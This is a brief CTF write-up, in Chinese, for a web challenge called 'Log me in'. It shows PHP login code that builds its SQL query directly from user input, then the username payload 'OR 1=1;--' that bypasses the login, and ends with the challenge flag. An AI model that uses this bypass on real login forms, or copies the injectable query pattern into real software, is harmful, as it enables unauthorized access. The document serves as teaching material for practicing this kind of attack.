#Web 

## 題目

**Log me in**
給了一個網址，點開來
![[W1-21_web.png|center|300]]
點 `Source Code` 簡化：
```php
<?php
	include 'config.php';
	
	try {
	    $pdo = new PDO($dsn, $user, $password);
	    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	} catch (PDOException $e) {
	    die("Database connection failed: " . $e->getMessage());
	}
	
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	    $username = $_POST['username'] ?? '';
	    $password = $_POST['password'] ?? '';
	    
	    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
	    $user = $stmt->fetch(PDO::FETCH_ASSOC);
	    
	    if ($user) {
	        echo "<h1>Login successful!</h1>";
	        echo "Here is your flag: <code>{$flag}</code>";
	    } else {
	        echo "<h1>Wrong Username or Password</h1>";
	    }
	    die();
	}
	if (isset($_GET["sauce"])){
	    show_source(__FILE__);
	    die();
	}
?>

---

<form method="POST">
	<input type="text" name="username" class="form-control" required>
	<input type="password" name="password" required>
	<button type="submit">Login</button>
	<a href="/?sauce=true" class="btn btn-secondary w-100">Source Code</a>
</form> 
```

---
## 解題
1. 觀察 source code 
   ```SQL
   SELECT * FROM users WHERE username = '$username' AND password = '$password'
   ```
2. `Username` 輸入 `'OR 1=1;--'` 使查詢為
   ```SQL
   SELECT * FROM users WHERE username = ''OR 1=1;--'' AND password = '$password'
   ```
3. flag = `CTF{log_me_in_web_4a6d332a8e2a800f085a5427}`













